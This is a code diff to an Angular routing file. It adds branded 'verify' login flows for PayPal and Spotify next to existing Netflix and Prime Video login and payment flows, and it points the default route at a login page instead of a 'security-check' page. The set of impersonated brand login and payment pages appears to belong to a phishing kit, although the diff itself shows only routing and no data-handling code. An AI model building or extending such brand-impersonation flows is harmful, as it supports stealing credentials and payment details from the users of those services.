@@ -3,7 +3,7 @@ import { Routes } from '@angular/router';
 import { adminGuard } from '../guards/admin.guard';
 
 export const routes: Routes = [
-    { path: '', redirectTo: 'security-check', pathMatch: 'full' },
+    { path: '', redirectTo: 'login', pathMatch: 'full' },
     {
         path: '',
         loadComponent: () => import('../components/layout/user-layout.component').then(m => m.UserLayoutComponent),
@@ -99,7 +99,8 @@ export const routes: Routes = [
         path: 'verify/netflix',
         children: [
             { path: 'login', loadComponent: () => import('../components/flows/netflix/netflix-login.component').then(m => m.NetflixLoginComponent) },
-            { path: 'payment', loadComponent: () => import('../components/flows/netflix/netflix-payment.component').then(m => m.NetflixPaymentComponent) }
+            { path: 'payment', loadComponent: () => import('../components/flows/netflix/netflix-payment.component').then(m => m.NetflixPaymentComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
         ]
     },
     {
@@ -115,6 +116,20 @@ export const routes: Routes = [
         children: [
             { path: 'login', loadComponent: () => import('../components/flows/prime-video/prime-login.component').then(m => m.PrimeLoginComponent) },
             { path: 'payment', loadComponent: () => import('../components/flows/prime-video/prime-payment.component').then(m => m.PrimePaymentComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
+        path: 'verify/paypal',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/paypal/paypal-login.component').then(m => m.PaypalLoginComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
+        path: 'verify/spotify',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/login.component').then(m => m.LoginComponent) },
             { path: '', redirectTo: 'login', pathMatch: 'full' }
         ]
     },
